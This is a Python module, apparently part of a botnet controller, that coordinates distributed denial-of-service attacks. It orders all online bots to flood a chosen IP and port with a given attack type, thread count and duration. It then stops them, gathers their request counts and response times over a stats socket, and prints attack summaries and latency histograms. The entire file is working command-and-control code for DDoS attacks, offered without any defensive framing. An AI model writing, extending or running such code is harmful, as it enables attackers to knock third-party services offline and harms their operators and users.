# attacks.py: gestión de ataques DDoS y estadísticas
import socket
import threading
import time

from bots import BotManager
from utils import send_message

STATS_PORT = 65433

class AttackManager:
    def __init__(self, bot_manager: BotManager):
        self.bot_manager = bot_manager
        self.stats_lock = threading.Lock()
        self.all_response_times = []
        self.bot_requests = {}
        self.last_result = {}
        self.is_attacking = False
        self.start_time = None
        self.target_ip = None
        self.target_port = None
    
    def get_live_metrics(self):
        elapsed = int(time.time() - self.start_time) if self.start_time else 0
        rps = len(self.all_response_times) // max(1, elapsed) if elapsed else 0
        return {
            "bots": len(self.bot_manager.get_online_bots()),
            "rps": rps,
            "elapsed": elapsed
        }

    def start_attack(self, attack_type, target_ip, target_port, threads, duration):
        if self.is_attacking:
            return {"error": "Already attacking."}

        online_bots = self.bot_manager.get_online_bots()
        if not online_bots:
            return {"error": "No online bots available."}

        with self.stats_lock:
            self.all_response_times.clear()
        self.bot_requests.clear()

        for ip, port in online_bots:
            send_message(f"START {attack_type} {target_ip} {target_port} {threads} {duration}", ip, port)

        self.start_time = time.time()
        self.target_ip = target_ip
        self.target_port = target_port
        self.is_attacking = True

        threading.Thread(target=self._auto_stop, args=(duration, online_bots), daemon=True).start()

        return {"message": f"Attack started on {target_ip}:{target_port} with {len(online_bots)} bots."}

    def _auto_stop(self, duration, bots):
        time.sleep(duration)
        for ip, port in bots:
            send_message("STOP", ip, port)
        time.sleep(5)
        result = self.collect_attack_data(bots)
        self.last_result = result
        self.is_attacking = False

    def stop_attack(self):
        if not self.is_attacking:
            return {"error": "No ongoing attack."}
        bots = self.bot_manager.get_online_bots()
        for ip, port in bots:
            send_message("STOP", ip, port)
        time.sleep(5)
        result = self.collect_attack_data(bots)
        self.last_result = result
        self.is_attacking = False
        return {"message": "Attack stopped.", "result": result}

    def listen_for_stats(self):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.bind(('', STATS_PORT))
            s.listen()
            print(f"[+] Listening for bot stats on port {STATS_PORT}")
            while True:
                try:
                    conn, addr = s.accept()
                    threading.Thread(target=self._handle_stat_connection, args=(conn, addr), daemon=True).start()
                except Exception as e:
                    print(f"[!] Stats connection error: {e}")

    def _handle_stat_connection(self, conn, addr):
        with conn:
            try:
                data = conn.recv(4096).decode().strip()
                if data.startswith("RESPONSE_DATA"):
                    parts = data.split()
                    if len(parts) < 5:
                        return
                    _, total_label, total_req, avg_label, avg_time, *rest = parts
                    if total_label != "TOTAL_REQUESTS" or avg_label != "AVERAGE_RESPONSE_TIME":
                        return
                    total_req = int(total_req)
                    avg_time = float(avg_time)
                    response_times = [float(rt) for rt in rest[1:] if rest and rest[0] == "RESPONSE_TIMES"]

                    with self.stats_lock:
                        self.all_response_times.extend(response_times)
                        self.bot_requests[addr[0]] = self.bot_requests.get(addr[0], 0) + total_req
            except Exception as e:
                print(f"[!] Error handling stat: {e}")

    def collect_attack_data(self, bots):
        end_time = time.time()
        duration = end_time - self.start_time
        total_requests = sum(self.bot_requests.values())
        avg_rps = total_requests / duration if duration > 0 else 0

        summary = {
            "Target": f"{self.target_ip}:{self.target_port}",
            "Duration": f"{duration:.2f} sec",
            "Total Requests": total_requests,
            "Avg RPS": f"{avg_rps:.2f}",
            "Bots": len(bots)
        }

        self._display_attack_statistics(summary, self.all_response_times)
        return summary

    def _display_attack_statistics(self, metadata, response_times):
        print("\n[ Attack Summary ]")
        for k, v in metadata.items():
            print(f"{k}: {v}")
        if not response_times:
            print("No response times reported.")
            return
        buckets = [(0,10),(10,20),(20,50),(50,100),(100,200),(200,500),(500,1000),(1000,2000),(2000,5000)]
        counts = {f"{a}-{b} ms": 0 for a,b in buckets}
        for rt in response_times:
            for a, b in buckets:
                if a <= rt < b:
                    counts[f"{a}-{b} ms"] += 1
                    break
        print("\n[ Response Time Distribution ]")
        total = sum(counts.values())
        for label, count in counts.items():
            pct = (count / total) * 100 if total > 0 else 0
            bar = '*' * int(pct / 2)
            print(f"{label}: {bar} ({pct:.2f}%)")

    def get_last_result(self):
        return self.last_result
